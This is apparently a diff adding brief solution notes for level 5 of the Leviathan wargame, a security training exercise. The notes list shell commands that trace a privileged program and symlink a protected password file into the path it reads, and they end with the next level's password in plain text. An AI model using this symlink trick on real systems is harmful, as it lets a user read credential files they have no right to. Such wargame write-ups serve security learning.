@@ -1,0 +1,11 @@
+- ls
+- ./leviathan5
+- ltrace ./leviathan5
+
+- touch /tmp/file.log
+- ./leviathan5 # output nothing since the we written anything to the file
+
+- ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
+- ./leviathan5
+
+leviathan6 password -> szo7HDB88w 
